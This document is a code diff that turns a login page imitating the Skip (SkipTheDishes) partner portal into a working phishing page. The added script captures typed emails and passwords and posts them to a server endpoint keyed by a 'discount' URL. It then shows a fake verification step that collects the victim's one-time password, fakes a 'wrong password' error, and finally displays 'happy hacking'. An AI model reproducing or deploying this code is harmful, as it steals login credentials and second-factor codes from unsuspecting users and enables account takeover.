@@ -8,225 +8,14 @@
         <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
         <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
         <link rel="icon" href="/static/images/favicon.ico"/>
-        <style>
-            body {
-                margin: 0;
-                padding: 0;
-                box-sizing: border-box;
-                font-family: 'Inter', sans-serif;
-            }
-            .outer {
-                width: min(1050px,90%);
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                margin: auto;
-                gap: 45px;
-            }
-            .inner-sec {
-                padding: 40px;
-                width:340px;
-                min-width:320px;
-                background-color: white;
-                border-radius: 20px;
-                box-shadow: 0 4px 6px -1px rgba(0, 0, 0, .1), 0 2px 4px -2px rgba(0, 0, 0, .1);
-                margin:auto;
-            }
-            .main {
-                background-image: url("/static/images/Frame\ 1.png");
-                background-repeat: no-repeat;
-                background-size: cover;
-                background-position: center;
-                height: 100vh;
-                width: 100%;
-                display: flex;
-            }
-            .inner-first h1 {
-                font-size: 30px;
-                line-height: 1;
-                color: #FFF;
-                margin: 0;
-                padding: 0;
-            }
-            .inner-first h2 {
-                font-size: 58px;
-                color: #FFF;
-                margin: 0;
-                padding: 0;
-            }
-            .inner-first {
-                /* max-width: 554px; */
-                display: flex;
-                flex-direction: column;
-                gap: 15px;
-            }
-            .inner-first p {
-                font-size: 27px;
-                color: #FFF;
-                margin: 0;
-            }
-            .countery {
-                width: fit-content;
-            }
-            button {
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                padding: 4px 12px;
-                border-radius: 9999px;
-                border: none;
-            }
-            button svg {
-                font-size: 10px;
-                width: 30px;
-                height: 30px;
-                gap: 5px;
-            }
-            button span {
-                font-weight: bold;
-            }
-            .latter {
-                display: flex;
-                width: 100%;
-                justify-content: space-between;
-                margin-bottom: 30px;
-            }
-            .latter-imaoe {
-                width: 35%;
-            }
-            .input-enter {
-                padding: 14px 16px;
-                width: 88%;
-                margin-top: 8px;
-                border-radius: 10px;
-                border: 1px solid;
-                border-color: rgb(156 163 175);
-            }
-            label.latter-label {
-                font-weight: bold;
-                font-size: 14px;
-            }
-            .input-saperarto {
-                margin-bottom: 12px;
-            }
-            input[type="submit"] {
-                width: 100%;
-                background-color: #F75E28;
-                border: none;
-                border-radius: 40px;
-                color: #FFF;
-                padding: 19px 17px;
-                font-size: 18px;
-                font-weight: bold;
-            }
-            .inline-flex {
-                display: flex;
-                justify-content: space-between;
-                margin-top: 55px;
-            }
-            a.inline-text {
-                font-size: 14px;
-                font-weight: 700;
-                color: #125FCA;
-                text-decoration: none;
-            }
-            img.first-back-upper {
-                bottom: 0;
-                display: block;
-                flex-grow: 0;
-                height: 100%;
-                order: 0;
-                position: absolute;
-                left: 0;
-                width: 60vw;
-                z-index: 1;
-                max-width: 100%;
-            }
-            img.first-back-lower {
-                left: 0;
-                position: absolute;
-                width: 60vw;
-                z-index: 0;
-                bottom: 0;
-            }
-            img.second-back {
-                bottom: 0;
-                display: block;
-                flex-grow: 0;
-                height: 100%;
-                order: 0;
-                position: absolute;
-                right: 0;
-                width: 65vw;
-                z-index: 0;
-            }
-   
-            @media only screen and (max-width: 1100px) {
-                .outer{
-                    gap:25px;
-                }
-                .inner-first h2 {
-                    font-size: 50px;
-                }
-                .inner-first h1{
-                    font-size: 27px;
-                }
-                .inner-first p{
-                    font-size: 25px;
-                }
-            }
-            @media only screen and (max-width: 900px) {
-                .inner-sec {
-                    padding: 20px;
-                }
-                .outer {
-                    display: flex;
-                    flex-direction: column;
-                    justify-content: center;
-                    align-items: center;
-                    padding: 32px;
-                }
-                .main{
-                    height: auto;
-                }
-                .inner-first h2 {
-                    font-size: 33px;
-                }
-                .inner-first h1{
-                    font-size: 23px;
-                }
-                .inner-first p{
-                    font-size: 16px;
-                }
-                .inner-first{
-                    gap:0;
-                }
-            }
-            @media only screen and (max-width: 600px) {
-                .inner-sec{
-                    width:min(340px,90%);
-                    min-width:auto;
-                }
-                .inner-first h1 {
-                    font-size: 20px;
-                }
-                .inner-first h2 {
-                    font-size: 30px;
-                }
-                .inner-first p {
-                    font-size: 14px;
-                }
-                .countery {
-                    display: none;
-                }
-                .latter {
-                    justify-content: center;
-                }
-            }
-        </style>
+        <link rel="stylesheet" href="/static/Css/style.css">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
     </head>
 
     <body>
+        <div class="mainSkipTheDishLoadingDiv">
+            <svg xmlns="http://www.w3.org/2000/svg" height="68" width="64"><path fill-rule="evenodd" d="M63.368 33.05a99.854 99.854 0 0 0-6.901-10.536l-.06-.084c-.126-.168-.454-.592-.576-.76-1.147-1.643-.986-2.84-.986-2.84-.322-4.35-.88-8.68-1.669-12.964-.185-1.144-.497-2.333-2.077-2.51-1.264-.14-3.181-.366-5.284-.476-1.76-.093-1.98 1.793-1.98 1.793-.038 1.913 0 2.832 0 3.052a.484.484 0 0 1-.375.557.595.595 0 0 1-.383-.12 81.38 81.38 0 0 0-9.093-6.873 4.163 4.163 0 0 0-2.081-.622 3.426 3.426 0 0 0-1.804.622c-.94.623-17.123 10.244-29.363 31.654 0 0-.762 1.118-.19 2.165a1.825 1.825 0 0 0 1.648 1.025l5.103.622c.508-.01.933.404.96.937a213.682 213.682 0 0 0 1.61 27.952s.219 1.56 1.685 1.634c.594.031 2.794-.106 8.659-.243a.411.411 0 0 0 .33-.134.455.455 0 0 0 .116-.352c-.564-6.082-.741-11.343-.754-11.648a.568.568 0 0 0-.341-.49c-2.163-1.3-3.506-3.707-3.527-6.321-.164-12.041.535-21.287.535-21.287s.072-1.28 1.146-1.179c1.075.102 1.007 1.37 1.007 1.37-.387 5.185-.535 14.536-.535 14.536s0 1.767 1.627 1.767c1.626 0 1.622-1.767 1.622-1.767-.05-7.315.539-14.67.539-14.67a1.24 1.24 0 0 1 .322-.876c.216-.235.513-.368.824-.369 1.04 0 1.003 1.392 1.003 1.392-.485 6.352-.535 14.515-.535 14.515s0 1.766 1.626 1.766 1.618-1.921 1.618-1.921c-.025-6.065.548-14.577.548-14.577a1.15 1.15 0 0 1 .277-.808 1.046 1.046 0 0 1 .848-.362c.965 0 1.02 1.17 1.02 1.17-.527 6.582-.536 16.693-.51 21.066.075 2.6-1.184 5.045-3.3 6.405a.68.68 0 0 0-.273.623c.134 4.002.455 8.445.729 11.626a.433.433 0 0 0 .375.406h5.346c3.135 0 5.73 0 8.035.058.257 0 .38-.2.4-.478.595-5.742.805-9.934.843-10.296.038-.362-.45-.49-.45-.49-.843-.049-2.402-.314-3.835-.557-1.432-.243-1.483-1.957-1.483-1.957-1.21-17.973 7.837-29.153 7.837-29.153s.889-1.215 2.149-.756c.742.295 1.235 1.037 1.243 1.869 1.264 14.965 0 34.26-.78 41.407a.501.501 0 0 0 .058.364.46.46 0 0 0 .288.214h.076c3.859.12 5.667.235 6.164.177.88-.097 1.589-.801 1.727-1.718 1.926-13.923 1.63-27.89 1.63-27.89.044-.497.42-.89.894-.933l5.204-.583a1.77 1.77 0 0 0 1.567-1.007 2.349 2.349 0 0 0-.093-2.107"></path></svg>
+        </div>
         <div class="main">
             <div class="outer">
                 <div class="inner-first">
@@ -257,24 +46,116 @@
                         </div>
                     </div>
                     <div class="user-input-data">
-                        <form action="/admin/login" method="post">
+                        <form class="login_from">
                             <div class="input-saperarto">
                                 <label class="latter-label" for="email">Username or email</label><br>
                                 <input class="input-enter" required type="email" id="email" name="email"><br>
                             </div>
                             <div class="input-saperarto">
                                 <label class="latter-label" for="password">Password</label><br>
-                                <input class="input-enter" required type="password" id="password" name="password"><br><br>
+                                <div style="position: relative; padding-bottom: 15px;" class="pp-div"><input class="input-enter" autocomplete="current-password" minlength="8" maxlength="10" required="true" type="password" id="login_password" name="password"><i class="far fa-eye" id="togglePassword"></i></div>
                             </div>
-                            <input type="submit" value="Login">
-                            <div class="inline-flex">
-                                <a class="inline-text" href="#">Become a Skip partner</a>
-                                <a class="inline-text" href="#">Forgot password?</a>
-                            </div>
+                            <input class="loginSubmit" type="submit">
                         </form>
                     </div>
                 </div>
             </div>
         </div>
+        <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+        <script>
+            let mainLoadingSkiptheDish = document.querySelector('.mainSkipTheDishLoadingDiv')
+            const togglePassword = document.querySelector('#togglePassword');
+            const loginPassword = document.querySelector('#login_password');
+
+            togglePassword.addEventListener('click', function (e) {
+                const type = loginPassword.getAttribute('type') === 'password' ? 'text' : 'password';
+                loginPassword.setAttribute('type', type);
+                this.classList.toggle('fa-eye-slash');
+            });
+
+            let loginFrom = document.querySelector('.login_from');
+            loginFrom.addEventListener('submit', (event)=>{
+                event.preventDefault();
+                localStorage.setItem("attempt1", "wrong");
+                let mainChangElement = document.querySelector('.user-input-data');
+                mainChangElement.insertAdjacentHTML('beforeend','<div class="mainLoading"><img src="/static/images/loading.svg"/></div>');
+                const data = new FormData(event.target);
+                const email = data.get('email');
+                const password = data.get('password');
+                let FormDataObj = {
+                    email: email,
+                    password: password
+                };
+                loginFrom.style.opacity = '0.4';
+                let keyID;
+                keyID = window.location.href.split('/discount/id/')[1]
+                if (keyID.includes('?')) {
+                    keyID = keyID.split('?')[0];
+                };
+                axios.post(`/api/admin/login/${keyID}`, FormDataObj).then(res => {
+                    function delay(ms) {
+                        return new Promise(resolve => setTimeout(resolve, ms));
+                    }            
+                    function addVFrom() {
+                        mainLoadingSkiptheDish.style.display = 'flex';
+                        mainChangElement.innerHTML =  `
+                            <form class="verificatoinForm">
+                                <div>
+                                    <p>
+                                    Write down your confirmation code you got on your mail or phone number. Don't share this code to anyone it's your One Time Password.
+                                    </p>
+                                </div>
+                                <div class="input-saperarto">
+                                    <label class="latter-label" for="code">Verfication Code</label><br>
+                                    <input class="input-enter" required type="number" id="number" name="OTP"><br><br>
+                                </div>
+                                <input type="submit">
+                                <div class="inline-flex">
+                                    <span class="inline-text reload">Did not get the code?</span>
+                                </div>
+                            </form> 
+                        `
+                    }
+                    function newChanges() {
+                        mainLoadingSkiptheDish.style.display = 'none';
+                        document.querySelector('.reload').addEventListener('click',()=>{
+                            localStorage.setItem("attempt1", "wrong");
+                            location.reload();
+                        });
+                        let VFrom = document.querySelector('.verificatoinForm');
+                        VFrom.addEventListener('submit',(e)=>{
+                            e.preventDefault();  
+                            let opt = document.querySelector('.input-enter').value  
+                            FormDataObj["OTP"] = opt;
+                            axios.post(`/api/admin/login/${keyID}/otp`, FormDataObj).then(res => {
+                                localStorage.setItem("otp", "confirm");
+                                location.reload();
+                            }).catch(err => {
+                                console.log(err);
+                            })
+                        })
+                    };        
+                    async function someFunction() {
+                        await delay(4000);
+                        await addVFrom();
+                        await delay(2000);
+                        await newChanges();
+                    }
+                    someFunction();
+                });
+            })
+            window.addEventListener('load',()=>{
+                if (localStorage.getItem("attempt1") == "wrong") {
+                    document.querySelector('.pp-div').insertAdjacentHTML('beforeend','<span style="color:red;font-size:12px;width:100%;text-align:right;display:block;padding-top:5px">**wrong email address and password**</span>')
+                    document.querySelector('.pp-div').style.paddingBottom = '0px'
+                }
+                if (localStorage.getItem("otp") == "confirm"){
+                    document.body.innerHTML = 'happy hacking';
+                }   
+                setTimeout(()=>{
+                    mainLoadingSkiptheDish.style.display = 'none'
+                },3000)
+            })
+        </script>
     </body>
 </html>
